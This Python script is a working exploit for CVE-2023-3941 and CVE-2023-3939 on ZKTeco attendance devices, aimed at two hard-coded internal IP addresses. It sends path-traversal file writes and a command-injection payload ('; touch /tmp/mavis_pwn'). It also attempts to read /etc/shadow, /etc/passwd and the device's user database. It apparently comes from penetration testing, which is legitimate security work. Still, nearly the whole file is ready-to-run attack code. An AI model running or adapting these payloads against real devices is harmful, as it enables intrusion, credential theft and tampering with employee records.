#!/usr/bin/env python3
"""
Test CVE-2023-3941/3939 on ZK device using pyzk's connection primitives.
Test both May 3 (X628 PRO ZLM60_TFT) and Web UI device (ZMM200_TFT).
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket
import struct
import time
from zk import ZK, const
from zk.attendance import Attendance

TARGETS = [
    ('172.16.0.214', 'May 3 X628 PRO'),
    ('172.16.254.202', 'Web UI 4000TID-C'),
]

def make_packet_raw(command, session_id, reply_id, data=b''):
    """Build ZK packet matching pyzk's wire format."""
    # pyzk uses different checksum calculation - check source
    body = data
    body_len = len(body)
    checksum = 0  # pyzk uses 0 or computed
    header = struct.pack('<HHHHI', command, checksum, session_id, reply_id, body_len)
    return header + body

def send_test_packet(zk_conn, command, data, label=''):
    """Send raw packet via pyzk connection and get response."""
    sock = zk_conn.tcp
    session_id = zk_conn.session_id
    rid = (zk_conn.reply_id + 1) & 0xFFFF
    pkt = make_packet_raw(command, session_id, rid, data)
    try:
        sock.settimeout(3)
        sock.send(pkt)
        resp = sock.recv(4096)
        if len(resp) >= 8:
            rcmd, rchk, rsid, rrid = struct.unpack('<HHHH', resp[:8])
            body_len = struct.unpack('<I', resp[4:8])[0]
            body = resp[8:8+body_len] if body_len > 0 else b''
            print(f'  [{label}] rcmd=0x{rcmd:04X} ({"OK" if rcmd==2000 else "ERROR" if rcmd==2001 else "UNKNOWN" if rcmd==65535 else "OTHER"}) body_len={body_len}')
            if body:
                print(f'    body={body[:120]!r}')
            return rcmd
    except socket.timeout:
        print(f'  [{label}] TIMEOUT')
    except ConnectionResetError:
        print(f'  [{label}] RESET')
    except Exception as e:
        print(f'  [{label}] {type(e).__name__}: {e}')
    return None

# Path traversal payload builder
TRAV = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_test.txt"
TRAV_BIN = TRAV.encode() + b"\x00"
INJECT = b"; touch /tmp/mavis_pwn" + b"\x00"

def test_target(ip, name):
    print(f'\n{"="*60}')
    print(f'TARGET: {name} ({ip})')
    print(f'{"="*60}')
    zk = ZK(ip, port=4370, timeout=10, password=0)
    try:
        conn = zk.connect()
        if not conn:
            print('  [FAIL] connect returned None')
            return
    except Exception as e:
        print(f'  [FAIL] connect: {type(e).__name__}: {e}')
        return

    print(f'  [+] Connected')
    print(f'  Firmware: {conn.get_firmware_version()}')
    print(f'  Platform: {conn.get_platform()}')

    # Disable device for safe testing
    try:
        conn.disable_device()
        print(f'  [+] Device disabled')
    except Exception as e:
        print(f'  [!] disable failed: {e}')

    # Probe photo-related commands
    print(f'\n--- Probe photo-related commands ---')
    for cmd_code in [0x02F6, 0x02F7, 0x02F8, 0x02F9, 0x02FA, 0x02FB, 0x02FC, 0x02FD,
                     0x03F0, 0x03F1, 0x03F2, 0x03F3, 0x03F4, 0x03F5, 0x03F6, 0x03F7]:
        send_test_packet(conn, cmd_code, b'1.jpg\x00', label=f'CMD 0x{cmd_code:04X}')

    # CVE-2023-3941: USRPIC_WRQ with path traversal
    print(f'\n--- CVE-2023-3941: USRPIC upload path traversal ---')
    payload = b'PIN=1\x00' + TRAV_BIN + b'PWNED_CONTENT_MAVIS'
    for cmd in [0x02FA, 0x03F4, 0x02F8]:
        send_test_packet(conn, cmd, payload, label=f'WRITE 0x{cmd:04X}')

    # CVE-2023-3939: USRPIC delete with cmd injection
    print(f'\n--- CVE-2023-3939: USRPIC delete cmd injection ---')
    payload = b'PIN=1\x00' + INJECT
    for cmd in [0x02F7, 0x03F5]:
        send_test_packet(conn, cmd, payload, label=f'DEL 0x{cmd:04X}')

    # UPDATEFILE path traversal
    print(f'\n--- UPDATEFILE path traversal ---')
    payload = TRAV_BIN + b'UPLOADED_VIA_UPDATEFILE'
    send_test_packet(conn, 0x6A4, payload, label='UPDATEFILE 0x6A4')

    # READFILE attempts
    print(f'\n--- READFILE attempts ---')
    for path in [b'/etc/shadow\x00', b'/mnt/mtdblock/data/ZKDB.db\x00', b'/etc/passwd\x00']:
        send_test_packet(conn, 0x6A6, path, label=f'READFILE {path[:30]!r}')

    # Re-enable
    try:
        conn.enable_device()
    except: pass
    conn.disconnect()
    print(f'\n[+] Done {ip}')

def main():
    for ip, name in TARGETS:
        try:
            test_target(ip, name)
        except Exception as e:
            print(f'  [TOP-LEVEL FAIL] {type(e).__name__}: {e}')
        time.sleep(3)

if __name__ == '__main__':
    main()
